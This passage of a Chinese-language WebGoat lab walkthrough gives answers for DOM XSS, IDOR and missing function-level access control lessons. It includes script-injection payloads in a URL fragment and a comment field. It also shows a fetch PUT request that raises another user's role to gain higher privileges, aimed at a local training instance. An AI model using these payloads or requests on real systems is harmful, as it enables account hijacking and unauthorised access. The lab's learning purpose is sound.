146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token console class-name\" style=\"color:rgb(255, 203, 107)\">console</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">log</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;test handler&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token keyword\" style=\"font-style:italic\">this</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token property-access\">lessonContentView</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">showTestParam</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token plain\">param</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>因此可以在切換到 <a href=\"../../../github.com/WebGoat/WebGoat/blob/4d7d0058c3ba0b4e542ed7e964ee1056207b7a08/webgoat-container/src/main/resources/static/js/goatApp/view/LessonContentView.html\" target=\"_blank\" rel=\"noopener noreferrer\">LessonContentView.js</a> 這隻檔案，搜尋 <code>showTestParam</code> 可以看到：</p><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// src/main/resources/static/js/goatApp/view/LessonContentView.js</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">/* for testing */</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token function-variable function\" style=\"color:rgb(130, 170, 255)\">showTestParam</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">function</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">param</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token keyword\" style=\"font-style:italic\">this</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token property-access\">$el</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">find</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;.lesson-content&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">html</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;test:&#x27;</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">+</span><span class=\"token plain\"> param</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>從這裡可以看到它會把所有從 url 中取得的 <code>param</code> 利用 <code>$().html()</code> 的方式在網頁中「顯示/執行」。</p><p>答案：<code>start.mvc#test/</code>。</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q11\">Q11<a href=\"#q11\" class=\"hash-link\" aria-label=\"Q11的直接連結\" title=\"Q11的直接連結\">​</a></h4><p>承 Q10，在網址的地方輸入 <code>http://localhost:8080/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;</code>，即可在 console 視窗中看到答案。</p><blockquote><p>留意在 <code>&lt;/script&gt;</code> 中的 <code>/</code> 記得要用 encodeURI 先處理過。</p></blockquote><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q13\">Q13<a href=\"#q13\" class=\"hash-link\" aria-label=\"Q13的直接連結\" title=\"Q13的直接連結\">​</a></h4><p>在新增留言的地方輸入：</p><div class=\"language-html codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-html codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">script</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token script language-javascript\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token script language-javascript\">  webgoat</span><span class=\"token script language-javascript punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token script language-javascript property-access\">customjs</span><span class=\"token script language-javascript punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token script language-javascript method function property-access\" style=\"color:rgb(130, 170, 255)\">phoneHome</span><span class=\"token script language-javascript punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token script language-javascript punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token script language-javascript punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token script language-javascript\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token script language-javascript\"></span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;/</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">script</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>即可在 console 面版中看到答案。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"access-control-flow\">Access Control Flow<a href=\"#access-control-flow\" class=\"hash-link\" aria-label=\"Access Control Flow的直接連結\" title=\"Access Control Flow的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"insecure-direct-object-references\">Insecure Direct Object References<a href=\"#insecure-direct-object-references\" class=\"hash-link\" aria-label=\"Insecure Direct Object References的直接連結\" title=\"Insecure Direct Object References的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q2-3\">Q2<a href=\"#q2-3\" class=\"hash-link\" aria-label=\"Q2的直接連結\" title=\"Q2的直接連結\">​</a></h4><p>照著指示，user 輸入 <code>TOM</code>，pass 輸入 <code>red</code> 即可。</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q3-4\">Q3<a href=\"#q3-4\" class=\"hash-link\" aria-label=\"Q3的直接連結\" title=\"Q3的直接連結\">​</a></h4><p>按下 <code>View Profile</code> 的按鈕，並在 <strong>Network Panel</strong> 中看得到的回應，即可看到有差別的地方：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/BHVQo2U.png\" alt=\"imgur\" class=\"img_ev3q\"></p><p>答案輸入：<code>role,userId</code></p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q4-2\">Q4<a href=\"#q4-2\" class=\"hash-link\" aria-label=\"Q4的直接連結\" title=\"Q4的直接連結\">​</a></h4><p>從上一題得到的訊息中，可以看到 <code>userId</code>：</p><div class=\"language-json codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-json codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token property\">&quot;role&quot;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">3</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token property\">&quot;color&quot;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;yellow&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token property\">&quot;size&quot;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;small&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token property\">&quot;name&quot;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;Tom Cat&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token property\">&quot;userId&quot;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;2342384&quot;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>因此在答案中填入 <code>WebGoat/IDOR/profile/2342384</code> 即可。</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q5-1\">Q5<a href=\"#q5-1\" class=\"hash-link\" aria-label=\"Q5的直接連結\" title=\"Q5的直接連結\">​</a></h4><p>從網址列中試試看可以看到哪個使用者的資料，從原本 Tom 的 userId 往後加，會發現 userId 為 <code>24288</code> 是有用的：</p><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">http://localhost:8080/WebGoat/IDOR/profile/2342388</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>可以從中看到使用者 Buffalo Bill 的資訊：</p><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">role</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">3</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">color</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;brown&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">size</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;large&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">name</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;Buffalo Bill&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">userId</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">2342388</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><ol><li>由 RestFul API 的架構可知，如果要更新使用者資料，需要使用 <code>PUT</code> 方法；</li><li>此外，需要修改 <code>role</code> 內容的值，<strong>從 3 改成 1，給該使用者更高的權限</strong></li></ol><p>如此可以這樣發出請求來修改使用者的資料：</p><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">fetch</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;http://localhost:8080/WebGoat/IDOR/profile/2342388&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">method</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;PUT&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">headers</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token string-property property\">&#x27;content-type&#x27;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;application/json; charset=UTF-8&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">body</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token known-class-name class-name\" style=\"color:rgb(255, 203, 107)\">JSON</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">stringify</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token literal-property property\">color</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;red&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token literal-property property\">role</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">1</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token literal-property property\">size</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;large&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token literal-property property\">name</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;Buffalo Bill&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token literal-property property\">userId</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">2342388</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">then</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">response</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> response</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">json</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"missing-function-level-access-control\">Missing Function Level Access Control<a href=\"#missing-function-level-access-control\" class=\"hash-link\" aria-label=\"Missing Function Level Access Control的直接連結\" title=\"Missing Function Level Access Control的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q2-4\">Q2<a href=\"#q2-4\" class=\"hash-link\" aria-label=\"Q2的直接連結\" title=\"Q2的直接連結\">​</a></h4><p>從開發者工具的 Elements Panel 中可以看到有隱藏的元素 <code>.hidden-menu-item</code></p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/TGGo8cr.png\" alt=\"imgur\" class=\"img_ev3q\"></p><p>仔細打開來看，會看到在 <strong>Admin</strong> 的 menu-header 中又藏了 <strong>Users</strong> 和 <strong>Config</strong>：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/FvEtR8s.png\" alt=\"imgur\" class=\"img_ev3q\"></p><p>答案即是 <code>Users</code> 和 <code>Config</code>。</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q3-5\">Q3<a href=\"#q3-5\" class=\"hash-link\" aria-label=\"Q3的直接連結\" title=\"Q3的直接連結\">​</a></h4><p>從上一題中可以拿到檢視 Users 的連結是 <code>/users</code>，若直接將網址貼在網址列中，可以看到回傳目前有一個使用者的畫面。在提示（Hint）中告訴我們可以使用不同的 <code>Content-Type</code> 來試著打打看這道路由，於是：</p><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">fetch</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;http://localhost:8080/WebGoat/users/&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">headers</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token string-property property\">&#x27;content-type&#x27;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 